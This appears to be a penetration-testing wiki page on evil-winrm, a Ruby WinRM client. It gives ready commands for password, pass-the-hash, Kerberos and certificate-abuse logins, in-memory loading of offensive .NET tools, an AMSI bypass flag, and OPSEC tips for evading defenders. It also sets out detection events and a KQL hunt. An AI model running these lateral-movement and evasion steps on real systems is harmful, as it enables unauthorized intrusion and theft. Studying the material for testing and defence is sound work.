---
title: evil-winrm — Windows Remote Management toolkit
slug: evil-winrm
aliases: [evil-winrm-tool, hackplayers-evil-winrm]
---
{% raw %}

`evil-winrm` is hackplayers' Ruby client for Microsoft's Windows Remote Management (WinRM) protocol, built on top of the `winrm` and `winrm-fs` gems. It exists because the native `winrs.exe` and PowerShell's `Enter-PSSession` are awkward when you only have a hash, a certificate, or a need to push binaries into memory. Once you have valid credentials on an account that belongs to `Remote Management Users` or the local admins group on a Windows host with WinRM listening (5985/HTTP or 5986/HTTPS), evil-winrm is the fastest path from "I own this credential" to "I have a PowerShell prompt on the box". It shows up constantly in OSCP/CRTP-style boxes, internal pentests after credential dumps, and as the second hop in lateral-movement chains.

## Mental model

WinRM is SOAP over HTTP(S), implementing the WS-Management spec. Authentication happens at the HTTP layer (Negotiate/Kerberos/NTLM/Basic/Certificate), then a remote shell or PowerShell runspace is opened over the resulting channel. evil-winrm wraps that flow and bolts on offensive niceties:

```
[attacker shell]
   |  ruby + winrm gem
   v
HTTP POST /wsman  (NTLMSSP or Kerberos AP-REQ)
   |
   v
WinRM service (WSMan) -> wsmprovhost.exe -> PowerShell runspace
   |
   +-- upload/download via SMB-less file transfer (WinRM-FS chunking)
   +-- Invoke-Binary / Donut-Loader -> .NET assemblies loaded in-memory
   +-- AMSI bypass patch executed at session start (-a)
```

The "shell" you see is a PowerShell runspace inside `wsmprovhost.exe`, not `cmd.exe`. That distinction drives both tradecraft (you get PowerShell logging for free as a defender) and OPSEC.

## Tradecraft

Install — the gem is the canonical path; pipx-style isolation works too via `gem install --user-install` or a Ruby bundler.

```bash
# Debian/Kali
sudo gem install evil-winrm
# Pinned version for reproducibility on engagements
sudo gem install evil-winrm -v 3.5
# Or via Docker if you don't want Ruby on the host
docker run --rm -ti --name ewrm \
  -v "${PWD}/data:/data" oscarakaelvis/evil-winrm \
  -i 10.10.10.10 -u svc_backup -p 'P@ssw0rd!'
```

Password auth — the boring path. Use `-S` for HTTPS on 5986 and `--no-pass-policy` (older flag) or just accept the cert with `--ssl`.

```bash
evil-winrm -i 10.10.10.10 -u Administrator -p 'Spring2026!'
evil-winrm -i dc01.corp.local -u svc_sql -p 'Hunter2!' -S -P 5986
```

Pass-the-Hash — the most common reason to reach for the tool. Feed the NT hash from `secretsdump.py` or `lsassy`. NTLMv2 is negotiated over the wire; the NT hash is enough because Negotiate falls back to NTLM when Kerberos can't be used (IP target, no SPN).

```bash
evil-winrm -i 10.10.10.10 -u Administrator \
  -H 32ed87bdb5fdc5e9cba88547376818d4
```

Kerberos / overpass — point your resolver at the DC, kinit, then use `-r REALM`. evil-winrm shells out to the system Kerberos libraries, so `/etc/krb5.conf` and clock skew matter.

```bash
# /etc/krb5.conf has CORP.LOCAL pointing at the DC
export KRB5CCNAME=/tmp/svc_sql.ccache
impacket-getTGT corp.local/svc_sql -hashes :32ed87bd...
evil-winrm -i dc01.corp.local -u svc_sql -r CORP.LOCAL
```

Certificate auth — for hosts where WinRM is configured with `Set-Item WSMan:\localhost\Service\Auth\Certificate $true` and a user has a mapped client cert (common in ESC1/ESC3 abuse paths from `certipy`).

```bash
certipy req -u attacker@corp.local -p 'x' \
  -ca CORP-CA -template VulnUser -target ca.corp.local
openssl pkcs12 -in attacker.pfx -nocerts -out priv.key -nodes
openssl pkcs12 -in attacker.pfx -clcerts -nokeys -out pub.pem
evil-winrm -i dc01.corp.local -S \
  -c pub.pem -k priv.key --pub-key pub.pem --priv-key priv.key
```

Useful runtime flags:

- `-a` — auto-execute an AMSI bypass at session start. Loud. See [[amsi-bypass]].
- `-N` — disable the colourised prompt; helps when piping or screenshotting cleanly.
- `-s /opt/scripts/` — local scripts directory; `Bypass-4MSI` and `menu` then offer tab-completion for `Invoke-Binary`, `Donut-Loader`, `Bypass-4MSI`, `services`, `upload`, `download`.
- `-e /opt/exes/` — local executables directory used by `Invoke-Binary`.

In-session, the killer features are `upload`, `download`, `Invoke-Binary`, and `Donut-Loader`:

```powershell
*Evil-WinRM* PS C:\> upload /opt/tools/SharpHound.exe C:\Windows\Temp\sh.exe
*Evil-WinRM* PS C:\> Invoke-Binary /opt/exes/Rubeus.exe triage
*Evil-WinRM* PS C:\> Donut-Loader -process_id 4321 -dotnetassembly /opt/exes/Seatbelt.exe
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt loot/flag.txt
```

`Invoke-Binary` base64s a .NET assembly and reflectively loads it with `[System.Reflection.Assembly]::Load`, so the binary never touches disk on the target — useful when Defender flags the on-disk version but lets the in-memory load through (until AMSI catches the assembly).

## Detection / telemetry

Defenders get a lot to work with — WinRM is one of the loudest "legitimate" admin protocols on Windows.

- **WinRM operational log** (`Microsoft-Windows-WinRM/Operational`): events **91** (session created), **142** (WSMan operation failed), **169** (user authenticated). Hunt for 91+169 from non-jumpbox source IPs to sensitive hosts.
- **Security log**: **4624** logon type 3 with `LogonProcessName = Kerberos` or `NTLM` to `wsmprovhost.exe` parent context; **4625** for failed auth bursts during spray.
- **PowerShell logging**: enable **4103** (module) and **4104** (script-block) globally. evil-winrm's session prelude is a fingerprint — the `[Console]::OutputEncoding = [Text.Encoding]::UTF8` plus `$PSDefaultParameterValues` writes and the `function prompt` redefinition land in 4104 verbatim. The AMSI bypass under `-a` produces a 4104 with `System.Management.Automation.AmsiUtils` and `amsiInitFailed` strings — Defender raises `Behavior:Win32/AmsiTamper` and 4104 marks it as suspicious automatically.
- **Sysmon**: event **1** for `wsmprovhost.exe` spawning `powershell.exe` children; event **3** for outbound 5985/5986 from unusual hosts.
- **EDR**: Defender, CrowdStrike, and Sentinel all ship rules for `wsmprovhost.exe -> powershell.exe -> .NET in-memory load`. Donut-Loader's RWX allocation in a remote process surfaces as suspicious memory operations.

A starter KQL hunt for Defender for Endpoint:

```kusto
DeviceProcessEvents
| where InitiatingProcessFileName =~ "wsmprovhost.exe"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("FromBase64String", "Reflection.Assembly", "amsiInitFailed")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessParentFileName
```

## OPSEC pitfalls

- The session banner and prompt rewrite are a signature. `-N` hides the colourisation but the encoding/prompt commands still hit 4104. Assume the session is logged.
- `-a` (AMSI bypass) is fingerprinted by every modern EDR. Prefer manual, fresh bypass techniques loaded via `-s` over the built-in. See [[applocker-bypass-techniques]] when Constrained Language Mode is on — evil-winrm becomes near-useless under CLM without a bypass.
- `upload` chunks files over WinRM-FS, which writes to `C:\Users\<user>\AppData\Local\Temp\` first. Even after delete, USN journal and `$LogFile` remember.
- Source IP shows up in WinRM 91/169 — run from a jumpbox that already legitimately speaks WinRM to the target, not from your Kali laptop's address. Blend, don't pioneer.
- Don't use evil-winrm for initial access. It's the credential-in-hand tool. Reaching it usually means you ran [[pass-the-hash]] or [[overpass-the-hash]] first, and your detection surface is already wide.

## References

- https://github.com/Hackplayers/evil-winrm
- https://learn.microsoft.com/en-us/windows/win32/winrm/portal
- https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging
- https://attack.mitre.org/techniques/T1021/006/
- https://www.rapid7.com/blog/post/2017/12/14/evading-amsi-techniques/
- https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f

See also: [[winrm-exec]], [[lateral-movement-playbook]], [[pass-the-hash]], [[overpass-the-hash]], [[amsi-bypass]], [[applocker-bypass-techniques]], [[living-off-the-land]]

{% endraw %}
